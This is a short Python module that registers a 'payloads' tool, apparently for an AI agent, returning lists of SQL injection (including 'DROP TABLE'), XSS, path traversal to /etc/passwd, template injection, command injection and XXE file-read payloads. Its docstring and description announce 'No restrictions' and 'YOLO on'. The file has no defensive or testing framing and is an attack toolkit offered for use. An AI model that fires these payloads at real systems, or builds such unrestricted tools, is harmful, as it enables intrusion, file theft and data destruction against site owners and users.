"""
Common payloads. No restrictions.
"""
from tools.registry import registry

PAYLOADS = {
    "sqli": ["' OR 1=1--", "' UNION SELECT NULL--", "1; DROP TABLE--"],
    "xss": ["<script>alert(1)</script>", "\"onmouseover=alert(1)", "<img src=x onerror=alert(1)>"],
    "lfi": ["../../../etc/passwd", "....//....//etc/passwd", "/etc/passwd"],
    "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
    "cmd": ["; id", "| id", "$(id)", "`id`"],
    "xxe": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"],
}

def _payloads(args):
    kind = args.get("kind", "all")
    if kind == "all":
        return {"success": True, "yolo": True, "payloads": PAYLOADS}
    return {"success": True, "yolo": True, "kind": kind, "payloads": PAYLOADS.get(kind, [])}

registry.register(
    name="payloads",
    toolset="payloads",
    schema={"type": "object", "properties": {"kind": {"type": "string"}}, "required": []},
    handler=_payloads,
    description="Common payloads. sqli, xss, lfi, ssti, cmd, xxe. YOLO on.",
)
registry.register_toolset_alias("payloads", "payloads")
